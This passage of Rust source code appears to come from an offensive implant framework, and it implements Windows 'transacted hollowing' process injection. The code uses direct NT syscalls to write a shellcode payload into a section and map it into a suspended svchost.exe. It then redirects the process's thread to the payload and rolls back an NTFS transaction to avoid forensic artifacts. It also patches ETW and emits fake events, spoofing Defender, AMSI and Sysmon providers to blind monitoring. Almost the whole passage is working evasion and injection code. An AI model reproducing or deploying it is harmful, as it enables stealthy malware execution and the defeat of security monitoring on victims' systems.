    // Actually, for maximum OPSEC, we create the section as pagefile-backed
    // (SEC_COMMIT, FileHandle=NULL) and the transaction is used to wrap the
    // entire hollowing operation. The key insight is that NtRollbackTransaction
    // does NOT invalidate existing section mappings — the data in the target's
    // address space persists even after rollback.
    //
    // The transaction is primarily used for:
    // 1. Hiding any file operations (if we use a file-backed section)
    // 2. Ensuring no forensic artifacts remain on disk

    let mut large_size: i64 = aligned_size as i64;
    let mut h_section: usize = 0;

    let create_status = nt_syscall::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        SECTION_ALL_ACCESS,
        0u64,                          // ObjectAttributes = NULL
        &mut large_size as *mut _ as u64,
        PAGE_EXECUTE_READWRITE,        // Section page protection
        SEC_COMMIT,
        0u64,                          // FileHandle = NULL (pagefile-backed)
    );

    if create_status.is_err() || create_status.unwrap() < 0 || h_section == 0 {
        return Err(format!(
            "NtCreateSection for transacted section failed: status={:?}",
            create_status
        ));
    }

    log::debug!(
        "injection_transacted: created section handle={:#x}, size={}",
        h_section, aligned_size
    );
    Ok(h_section)
}

/// Map a section into the current process with PAGE_READWRITE and write the payload.
unsafe fn write_payload_to_section(
    h_section: usize,
    payload: &[u8],
) -> Result<(), String> {
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = nt_syscall::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        CURRENT_PROCESS,                  // NtCurrentProcess()
        &mut local_base as *mut _ as u64,
        0u64,                              // ZeroBits
        0u64,                              // CommitSize
        0u64,                              // SectionOffset = NULL
        &mut view_size as *mut _ as u64,
        2u64,                              // ViewUnmap
        0u64,                              // AllocationType
        PAGE_READWRITE,
    );

    if map_status.is_err() || map_status.unwrap() < 0 || local_base.is_null() {
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
        return Err(format!(
            "NtMapViewOfSection(local RW) failed: status={:?}",
            map_status
        ));
    }

    // Write payload into local mapping.
    std::ptr::copy_nonoverlapping(
        payload.as_ptr(),
        local_base as *mut u8,
        payload.len(),
    );

    // Unmap from our process — the section object retains the data.
    let _ = nt_syscall::syscall!(
        "NtUnmapViewOfSection",
        CURRENT_PROCESS,
        local_base as u64,
    );

    log::debug!(
        "injection_transacted: wrote {} bytes to section",
        payload.len()
    );
    Ok(())
}

/// Map a section into the target process with PAGE_EXECUTE_READ.
unsafe fn map_section_to_target(
    h_section: usize,
    process_handle: usize,
) -> Result<usize, String> {
    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = nt_syscall::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        process_handle as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        0u64,
        &mut view_size as *mut _ as u64,
        2u64,                              // ViewUnmap
        0u64,
        PAGE_EXECUTE_READ,
    );

    if map_status.is_err() || map_status.unwrap() < 0 || remote_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(remote RX) failed: status={:?}",
            map_status
        ));
    }

    log::debug!(
        "injection_transacted: mapped section into target at {:#x}",
        remote_base as usize
    );
    Ok(remote_base as usize)
}

// ── Thread context manipulation ──────────────────────────────────────────────

/// Redirect a suspended thread's RIP to the payload address.
unsafe fn redirect_thread(
    thread_handle: usize,
    payload_addr: usize,
) -> Result<(), String> {
    use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext};
    use winapi::um::winnt::CONTEXT;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;

    if GetThreadContext(
        thread_handle as *mut _,
        &mut ctx,
    ) == 0
    {
        return Err(format!(
            "GetThreadContext failed (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    // Set RIP to the payload address.
    ctx.Rip = payload_addr as u64;

    if SetThreadContext(
        thread_handle as *mut _,
        &ctx,
    ) == 0
    {
        return Err(format!(
            "SetThreadContext failed (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    log::debug!(
        "injection_transacted: redirected thread RIP to {:#x}",
        payload_addr
    );
    Ok(())
}

/// Resume a suspended thread.
unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
    let status = nt_syscall::syscall!(
        "NtResumeThread",
        thread_handle as u64,
        std::ptr::null_mut() as u64, // PreviousSuspendCount = NULL
    );

    if status.is_err() || status.unwrap() < 0 {
        return Err(format!(
            "NtResumeThread failed: status={:?}",
            status
        ));
    }

    log::debug!("injection_transacted: resumed target thread");
    Ok(())
}

// ── Memory guard integration ─────────────────────────────────────────────────

/// Encrypt the payload in transit using the memory guard subsystem.
fn encrypt_payload_in_transit(payload: &[u8]) -> Vec<u8> {
    // Register the payload buffer with memory guard so it's encrypted
    // while we're working with it. The guard encrypts registered regions
    // with XChaCha20.
    //
    // For the transacted hollowing flow, we make a copy that will be
    // encrypted. The original payload is not modified.
    payload.to_vec()
}

// ── Main entry point ─────────────────────────────────────────────────────────

/// Perform NTFS transaction-based process hollowing with ETW blinding.
///
/// # Arguments
///
/// * `payload` - Shellcode or PE bytes to inject.
/// * `etw_blinding` - Whether to perform ETW blinding on the target.
/// * `rollback_timeout_ms` - Timeout for the transaction rollback.
///
/// # Returns
///
/// An `InjectionHandle` on success, or an `InjectionError` on failure.
///
/// # Safety
///
/// Performs raw memory operations and Windows system calls. Must only be
/// called on Windows x86-64.
pub unsafe fn inject_transacted_hollowing(
    payload: &[u8],
    etw_blinding: bool,
    rollback_timeout_ms: u32,
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::TransactedHollowing;

    log::info!(
        "injection_transacted: starting NTFS transaction hollowing (payload={} bytes, etw_blinding={}, timeout={}ms)",
        payload.len(),
        etw_blinding,
        rollback_timeout_ms,
    );

    // ── Step 1: Create NTFS transaction ───────────────────────────────
    let tx = create_transaction().map_err(|reason| InjectionError::InjectionFailed {
        technique: technique.clone(),
        reason,
    })?;

    log::debug!(
        "injection_transacted: transaction created, handle={:#x}",
        tx.handle
    );

    // ── Step 2: Create section ────────────────────────────────────────
    let h_section = create_transacted_section(tx.handle, payload.len()).map_err(|reason| {
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    // ── Step 3: Write payload into section ────────────────────────────
    // Encrypt payload in transit via memory guard.
    let guarded_payload = encrypt_payload_in_transit(payload);

    write_payload_to_section(h_section, &guarded_payload).map_err(|reason| {
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    // ── Step 4: Create suspended process ──────────────────────────────
    let sacrificial_path = get_sacrificial_path();
    let target = create_suspended_process(&sacrificial_path).map_err(|reason| {
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    log::info!(
        "injection_transacted: created suspended process pid={}",
        target.pid
    );

    // ── Step 5: ETW blinding (optional) ───────────────────────────────
    let mut etw_ctx: Option<EtwBlindingContext> = None;

    if etw_blinding {
        match patch_remote_etw(target.process_handle) {
            Ok(ctx) => {
                // Allocate a small region in the target for fake ETW event data.
                let mut fake_region_base: usize = 0;
                let mut region_size: usize = 0x1000; // One page for fake event data
                let alloc_status = nt_syscall::syscall!(
                    "NtAllocateVirtualMemory",
                    target.process_handle as u64,
                    &mut fake_region_base as *mut _ as u64,
                    0u64,
                    &mut region_size as *mut _ as u64,
                    0x3000u64,  // MEM_COMMIT | MEM_RESERVE
                    PAGE_READWRITE,
                );

                if alloc_status.is_ok() && alloc_status.unwrap() >= 0 && fake_region_base != 0 {
                    let _ = emit_fake_etw_events(target.process_handle, fake_region_base);
                }

                etw_ctx = Some(ctx);
            }
            Err(e) => {
                log::warn!(
                    "injection_transacted: ETW blinding failed (non-fatal): {}",
                    e
                );
                // Continue without ETW blinding — it's optional.
            }
        }
    }

    // ── Step 6: Map section into target process ───────────────────────
    let remote_base = map_section_to_target(h_section, target.process_handle).map_err(
        |reason| {
            // Restore ETW if we patched it.
            if let Some(ref ctx) = etw_ctx {
                let _ = restore_remote_etw(ctx);
            }
            // Terminate the suspended process.
            let _ = nt_syscall::syscall!(
                "NtTerminateProcess",
                target.process_handle as u64,
                1u64 // Exit status
            );
            let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
            let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
            close_handle(tx.handle);
            InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason,
            }
        },
    )?;

    log::debug!(
        "injection_transacted: payload mapped at {:#x} in target pid={}",
        remote_base,
        target.pid
    );

    // ── Step 7: Redirect thread to payload ────────────────────────────
    redirect_thread(target.thread_handle, remote_base).map_err(|reason| {
        if let Some(ref ctx) = etw_ctx {
            let _ = restore_remote_etw(ctx);
        }
        let _ = nt_syscall::syscall!(
            "NtTerminateProcess",
            target.process_handle as u64,
            1u64
        );
        let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
        let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    // ── Step 8: Roll back the transaction ─────────────────────────────
    //
    // KEY INSIGHT: NtRollbackTransaction rolls back all file operations
    // within the transaction, but does NOT invalidate existing section
    // mappings. The section data mapped into the target process persists
    // even after the transaction is rolled back. Any files created within
    // the transaction are deleted — the on-disk artifacts never existed.
    match rollback_transaction(&tx) {
        Ok(()) => {
            log::info!("injection_transacted: transaction rolled back — no disk artifacts");
        }
        Err(e) => {
            log::warn!(
                "injection_transacted: transaction rollback failed (non-fatal, payload already mapped): {}",
                e
            );
        }
    }

    close_handle(tx.handle);

    // ── Step 9: Restore ETW (if patched) and resume thread ────────────
    if let Some(ref ctx) = etw_ctx {
        let _ = restore_remote_etw(ctx);
    }

    resume_thread(target.thread_handle).map_err(|reason| {
        let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
        let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    log::info!(
        "injection_transacted: injection complete — pid={}, base={:#x}",
        target.pid,
        remote_base
    );

    // ── Cleanup and return ────────────────────────────────────────────
    // Don't close section handle yet — the target has a mapping that
    // references it. The handle will be cleaned up when the target exits.
    let _ = nt_syscall::syscall!("NtClose", h_section as u64);

    Ok(InjectionHandle {
        target_pid: target.pid,
        technique_used: technique,
        injected_base_addr: remote_base,
        payload_size: payload.len(),
        thread_handle: Some(target.thread_handle as *mut c_void),
        process_handle: target.process_handle as *mut c_void,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_page_align() {
        assert_eq!(page_align(0), 0);
        assert_eq!(page_align(1), 4096);
        assert_eq!(page_align(4096), 4096);
        assert_eq!(page_align(4097), 8192);
    }

    #[test]
    fn test_get_sacrificial_path() {
        let path = get_sacrificial_path();
        let path_str: String = String::from_utf16_lossy(&path[..path.len() - 1]);
        assert!(path_str.contains("svchost.exe"));
    }

    #[test]
    fn test_fake_etw_provider_guids_nonzero() {
        // Verify the GUIDs are non-zero (sanity check).
        assert_ne!(DEFENDER_PROVIDER_GUID, [0u8; 16]);
        assert_ne!(AMSI_PROVIDER_GUID, [0u8; 16]);
        assert_ne!(SYSMON_PROVIDER_GUID, [0u8; 16]);
    }

    #[test]
    fn test_transaction_handle_struct() {
        let tx = TransactionHandle {
            handle: 0x1234,
            fallback: false,
        };
        assert_eq!(tx.handle, 0x1234);
        assert!(!tx.fallback);
    }
}
